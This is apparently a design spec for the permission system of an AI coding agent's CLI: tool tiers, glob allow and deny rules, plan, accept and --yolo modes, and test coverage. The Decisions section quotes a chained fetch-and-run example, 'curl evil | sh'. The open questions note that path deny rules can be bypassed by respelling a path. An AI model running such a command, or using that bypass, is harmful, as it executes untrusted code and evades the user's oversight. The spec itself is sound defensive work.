# Spec: Permissions

Status: retroactive (written 2026-09-09 for an existing feature)
Doc: docs/permissions.md · Source: src/permissions/policy.ts, src/core/agent.ts (`dispatchToolCall`), src/config/config.ts (`permissions` schema, `persistProjectRule`), src/cli.ts (policy construction, `--yolo`), src/core/session-commands.ts (`togglePlan`, `cycleMode`), src/tools/agent-tool.ts (sub-agent inheritance) · Tests: test/policy.test.ts, test/new-tools.test.ts (plan/accept mode), test/config.test.ts (`persistProjectRule`), test/deferred-tools.test.ts, test/schedule-tool.test.ts, test/agent-tool.test.ts, test/hooks-protocol.test.ts, test/highvalue.test.ts

## Goal

Every tool call the model makes is gated before it runs. Read-only tools run freely; file changes and
commands ask the user unless a rule, a mode, or `--yolo` says otherwise; and a deny list gives the user a
hard "never" that nothing — not `--yolo`, not accept mode, not a hook — can override. "Done" means: the
model can never execute a write or execute-tier call the user did not approve (directly or by rule), a
denied call tells the model why so it stops trying, and "always" answers persist so the same question is
not asked twice per project.

## Non-goals

- A policy language. Rules are prefix globs (`*` only) on one string per tool; no negation, no regex,
  no conditions. The file header in `policy.ts` calls this out as deliberate ("covers 95% of cases and
  stays auditable").
- Sandboxing or OS-level isolation. The gate is advisory to the tool layer; a tool that runs is trusted.
- Per-tool hook decisions — those live in [hooks](hooks.md) and are re-checked against this policy.
- The doom-loop ask — a separate synthetic prompt that ignores tiers; see [doom-loop](doom-loop.md).
- Path normalization for rules: `write(src/*)` matches the `path` string the model sent, not a resolved
  absolute path (see open questions).

## Constraints

- `src/` line budget (CI enforces < 10,000; 9,923 today). `policy.ts` is 163 lines.
- Layering: `src/permissions/` imports only `../tools/types.js` (the `PermissionTier` type). Frontends
  never decide; they only answer `OnPermission` requests (`src/core/events.ts`).
- Windows first-class: the bash segment split and the chained-command regex are shell-agnostic string
  scans — they do not parse PowerShell vs bash; PowerShell's `;` is caught, its `-and` is not.
- No new dependencies.

## Design

### Tiers

`PermissionTier = "read" | "write" | "execute"` (`src/tools/types.ts`). Each `ToolDef` declares
`permission`; `tierFor?(input)` overrides it per call (only `schedule` uses it: list/inspect/log/doctor
are read, add/run/pause/resume/remove are execute). As built: `read`, `ls`, `glob`, `grep`, `agent` are
read; `write`, `edit`, `memory` are write; `bash`, `schedule`, and every MCP tool
(`src/mcp/manager.ts`) are execute.

### Rule syntax and matching (`ruleMatches`, `globMatch`)

- `RULE_RE = /^([a-zA-Z0-9_]+)\((.*)\)$/`. A rule that matches it is `tool(pattern)`: the tool name must
  equal `RuleTarget.tool` exactly, then `pattern` is globbed against `RuleTarget.target`.
- A rule that does not match `RULE_RE` (e.g. `mcp__github__*`) is globbed against the tool name only.
- `globMatch`: split on `*`, regex-escape each piece, join with `.*`, anchor `^…$`. Nothing else is
  special — `?`, `[`, `{` are literal.

### Targets (`targetFor(toolName, input)`)

| Tool | `target` |
|---|---|
| `bash` | `input.command` |
| `agent` | `input.agent ?? input.mode ?? ""` — so `agent(worker)` / `agent(deploy-*)` control spawning |
| `schedule` | `"<action> <name>"` trimmed — `schedule(add *)`, `schedule(remove backup*)` |
| anything with a string `input.path` | that path, verbatim |
| otherwise | `""` (MCP tools: rules match on the bare tool name) |

### Policy state (`PermissionPolicy`)

```
constructor(projectRules: string[], yolo: boolean, denyRules: string[] = [])
sessionRules: string[]           // addSessionRule(); in-memory, lost on exit
mode: "manual" | "accept" | "plan"   // setMode(), setPlanMode(on), currentMode, inPlanMode
autoApprove                      // getter for yolo; /loop inherits it (session-commands.ts:126)
```

`cli.ts:147` builds it once per session: `new PermissionPolicy(config.permissions?.allow ?? [], flags.yolo,
config.permissions?.deny ?? [])`. `config.ts` concatenates global then project `permissions.allow` and
`permissions.deny` (both `z.array(z.string()).default([])`).

### Decision order (`decide(tier, t)`) — exactly as coded

1. `deniedBy(t)` matches → `"deny"`.
2. `tier === "read"` → `"allow"`.
3. `mode === "plan"` → `"deny"`.
4. `yolo` → `"allow"`.
5. `t.tool === "bash"` and `/[;&|`$><]/.test(t.target)` → `"ask"` (an allow rule must never authorize a
   chained command).
6. `mode === "accept"` and `tier === "write"` → `"allow"`.
7. Any rule in `[...projectRules, ...sessionRules]` matches → `"allow"`, else `"ask"`.

`deniedBy(t)`: returns the first matching deny rule string, or `undefined`. For `bash` it tests the whole
command **and** every segment of `target.split(/[;&|`$()]+/)` (trimmed, non-empty). The comment notes
over-splitting on parens/backticks only yields extra segments to test — a false positive is a blocked
call, not a breach. Note the deny split set (`;&|`$()`) differs from the ask regex (`;&|`$><`): redirects
force an ask but do not start a new deny segment.

### Modes

`manual` (default) → `accept` → `plan` → `manual` via `cycleMode` (Shift+Tab in the TUI,
`src/tui/App.tsx:893`); `/plan` uses `togglePlan` (plan ↔ manual). `setPlanMode(on)` is the older API
(`on ? "plan" : "manual"`), still used by tests.

### Enforcement in `Agent.dispatchToolCall` (`src/core/agent.ts:784-943`)

Order of gates, after the deferred-tool bridge remap and zod validation:

1. `target = targetFor(name, input)`; `tier = def.tierFor?.(input) ?? def.permission`;
   `policyDecision = policy.decide(tier, target)`.
2. `"deny"` → returns an error result without running hooks or prompting. Text depends on the cause:
   - deny rule: `Denied by permission rule ${rule} (permissions.deny in settings). Do not retry or work
     around this — use a different approach, or ask the user to change the rule.`
   - plan mode: `Plan mode is active: only read-only tools are allowed. Investigate with
     read/grep/glob/agent, then present a numbered step-by-step plan and stop — the user approves by
     turning plan mode off (/plan).`
3. Pre-hook (see hooks spec). A hook rewrite re-runs `tierFor` and `decide` on the new input; `"deny"`
   → `The pre-hook's rewritten input is blocked by a permission deny rule.` A hook `allow`/`ask` then
   overrides `policyDecision` — but only after the deny check, so a hook cannot lift a deny or plan mode.
4. `"ask"` → `preview = def.preview?.(input, ctx)` (errors swallowed), then
   `onPermission({ tool, input, summary, preview? })`:
   - `{ kind: "deny", reason? }` → `User denied permission for this action.` + ` Instruction: ${reason}`.
   - `{ kind: "allow-always", scope }` → `rule = PermissionPolicy.ruleFor(target)`; `addSessionRule(rule)`;
     if `scope === "project"` also `persistProjectRule(cwd, rule)` (errors swallowed) which appends to
     `.aerin/settings.json` → `permissions.allow`, deduplicated.
   - `{ kind: "allow" }` → proceed.
5. Only then the undo snapshot and `def.execute`.

### `ruleFor(t)` — what "always" persists

| Tool | Rule |
|---|---|
| `bash` | `bash(<first word> *)` — `git push origin main` → `bash(git *)` |
| `mcp__*` | the bare tool name |
| `schedule` | `schedule(<action> *)` |
| anything else | `${tool}(${target}*)` — `write(src/x.ts*)` (a per-file prefix) |

### Frontends

- TUI (`App.tsx:1117-1155`): `Yes` / `Yes, always for this project` / `No, tell the agent what to do
  instead`; "always" resolves `{ kind: "allow-always", scope: "project" }`; "No" (and Esc) opens a
  reason line before resolving `deny`. Esc during a pending dialog while interrupting resolves
  `{ kind: "deny", reason: "Interrupted." }` (`App.tsx:868`).
- REPL (`repl.ts:38-46`): `[y]es / [a]lways (project) / [n]o`, same decisions.
- Print mode (`print.ts:99`): `--yolo` → `allow`, else `deny` with
  `Non-interactive mode; re-run with --yolo to allow tools.`
- Research sub-agents get a fresh `new PermissionPolicy([], false)` and an `onPermission` that always
  denies (`Sub-agents cannot request permissions.`); their tool set is read-tier so it never fires.
  Workers (`mode:"worker"`) reuse the parent's policy object and route asks through a serialized
  wrapper that prefixes the summary with `Agent(<description>) › ` (`agent-tool.ts:68-77,137-143`).

## Invariants

- Deny rules are checked first in `decide()`, before the read fast path, plan mode, `--yolo`, accept
  mode and allow rules — test/policy.test.ts "deny beats an allow rule", "deny beats --yolo", "deny beats
  accept mode for writes", "deny applies to read-tier tools".
- A bash deny rule matches any segment of a chained command — test/policy.test.ts "deny catches segments
  of chained bash commands".
- An allow rule never authorizes a bash command containing `;&|`$><` — same test (`git pull && npm
  install` → ask); test/policy.test.ts has no positive-rule + chained case beyond that line.
- Plan mode denies write/execute, even under `--yolo`, and allows read — test/new-tools.test.ts
  "plan mode denies even with --yolo", "denies write/execute but allows read".
- Accept mode auto-allows write-tier only; execute still asks — test/new-tools.test.ts "accept mode
  auto-approves writes but not commands".
- Glob patterns escape regex metacharacters — test/policy.test.ts "regex metacharacters in patterns are
  escaped".
- A deny on the real tool name still applies to a call that arrived through the `tool_call` bridge —
  test/deferred-tools.test.ts "deny rules on the real tool name still bite through the bridge".
- A pre-hook rewrite cannot route around a deny rule — test/hooks-protocol.test.ts "a rewrite cannot
  route around a permission deny rule".
- `persistProjectRule` appends once, never duplicates — test/config.test.ts "persistProjectRule appends
  without duplicates".
- Worker sub-agent asks reach the parent's `onPermission` with an `Agent(...) ›` label, and a user deny
  stops the write — test/agent-tool.test.ts "worker mode writes files through the parent's permission
  gate", "worker mode respects a user denial".
- Session rules accumulate and are consulted with project rules — test/policy.test.ts "session rules
  accumulate".
- The model receives the deny-rule name in the error text — test/deferred-tools.test.ts (asserts
  `Denied by permission rule`); the plan-mode text is untested.
- `mode`/`yolo` never change the result for a denied target — untested as a combined property beyond the
  cases above.

## Acceptance criteria

1. Read-tier calls run without a prompt in every mode — test/policy.test.ts "read tier always allowed".
2. Write/execute calls with no matching rule ask — test/policy.test.ts "execute tier asks without a
   rule, allows with one".
3. `--yolo` allows everything not denied — test/policy.test.ts "yolo allows everything", "deny beats
   --yolo".
4. Deny rules beat allow rules, accept mode, `--yolo` and read tier — test/policy.test.ts (four tests).
5. Chained bash: deny matches per segment; allow rules still ask — test/policy.test.ts "deny catches
   segments of chained bash commands".
6. Plan mode denies write/execute regardless of `--yolo` — test/new-tools.test.ts.
7. Accept mode allows write-tier only — test/new-tools.test.ts, test/policy.test.ts.
8. Bare rules match MCP tool names by glob — test/policy.test.ts "bare rule matches tool name glob",
   "deny works for MCP tools by bare name".
9. `targetFor` maps bash/write/agent/schedule inputs as tabulated — test/policy.test.ts "targetFor",
   test/schedule-tool.test.ts "rules match on '<action> <name>'".
10. `ruleFor` produces `bash(<first word> *)`, bare MCP name, `schedule(<action> *)`, `tool(target*)` —
    test/policy.test.ts "ruleFor builds broad bash rule from first word", test/schedule-tool.test.ts.
11. "Always for this project" writes the rule to `.aerin/settings.json` `permissions.allow` and it loads
    back — test/config.test.ts (the function); the agent-loop path that calls it with `scope:"project"`
    is a **gap** (no test drives `allow-always` through `dispatchToolCall`).
12. A denied call returns an error result naming the rule and instructing the model not to work around
    it — test/deferred-tools.test.ts (rule path). Plan-mode message text: **gap**.
13. A user deny with a reason reaches the model as `Instruction: <reason>` — **gap** (agent-tool test
    checks the file is absent, not the text; doom-loop covers its own path only).
14. Cycling modes with Shift+Tab / `/plan` updates the policy — test/highvalue.test.ts "goal / plan /
    mode commands drive agent and policy".
15. Pre-hook rewrites are re-decided against the policy — test/hooks-protocol.test.ts.
16. Print mode denies all asks without `--yolo` — **gap** (no test of `modes/print.ts` permissions).
17. Global and project allow/deny lists merge — **gap** (config.test covers project persistence only;
    the concatenation in `loadConfig` has no dedicated assertion).

## Open questions / known gaps

- `PermissionDecision.scope: "session"` exists in the type but no frontend produces it — the TUI and
  REPL always send `"project"`. Either add a session-only choice or drop the scope.
- `ruleFor` for path tools yields `write(src/x.ts*)`, which also matches `src/x.ts.bak`. Harmless in
  practice, but not what "always" reads as.
- Path targets are the model's literal `path` string. `write(src/*)` does not match `./src/a.ts` or an
  absolute path; deny rules on paths can be sidestepped by spelling the path differently. Not reported
  as exploited; worth a `path.relative(cwd, …)` normalization in `targetFor` when budget allows.
- The chained-command ask regex fires on any `$` — `echo $HOME` asks even under `bash(echo *)`.
  Deliberate (safety over convenience) but undocumented in `docs/permissions.md`.
- Under accept mode, an `edit` whose path is denied returns the deny text; there is no UI distinction
  between "denied by rule" and "plan mode" beyond the message.
- `deniedBy` is called twice on the deny path (`decide` then again for the message). Cosmetic.
- Acceptance items 11 (agent-loop persistence), 12 (plan text), 13 (deny reason text), 16, 17 are
  untested.

## Decisions

- 2026-07-22 (5c4aa1f, initial): string rules with `*`-only globs and a manual permission gate in the
  agent loop (tools declare schemas only, never `execute`, so the gate always interposes). Chosen over a
  policy DSL for auditability. `ruleFor` broadens bash approvals to the first word.
- 2026-07-22 (6c590ce, v0.0.14): plan mode denies write/execute outright, even under `--yolo`; the deny
  text teaches the model to present a numbered plan and stop.
- 2026-07-22 (388bf17, v0.0.46): chained bash commands (`;&|`$><`) always ask even under an allow rule —
  `git log; curl evil | sh` matches `bash(git *)` but is a different action.
- 2026-07-22 (faf1703, v0.0.52): Shift+Tab cycles manual → accept → plan (Claude Code convention);
  accept is scoped to write-tier only so commands still ask.
- 2026-07-23 (7be1dc7, v0.0.92): a separate deny list, same syntax, checked before everything including
  read tier and `--yolo`; bash denies are matched per chained segment (over-splitting accepted because a
  false positive only blocks). The model is told the rule name and told not to work around it.
- 2026-07-23 (53d1c3a, v0.0.97): worker sub-agents inherit the parent's policy object and prompt through
  the parent's `onPermission`, serialized, with an `Agent(...) ›` label; research sub-agents get an empty
  policy and an always-deny callback. `targetFor("agent")` matches on agent name or mode so `agent(worker)`
  can be denied.
- 2026-07-23 (d5084d4, v0.0.102): pre-hooks run before the prompt but after the deny check; rewritten
  input is re-decided, so hooks can relax an ask but never a deny.
- 2026-09-09 (2cb7467): `ToolDef.tierFor` added so one tool can span tiers (`schedule`); rules match on
  `<action> <name>`; `ruleFor` approves the action, not the task name. `/loop` inherits
  `policy.autoApprove` so a `--yolo` session schedules `--yolo` runs.
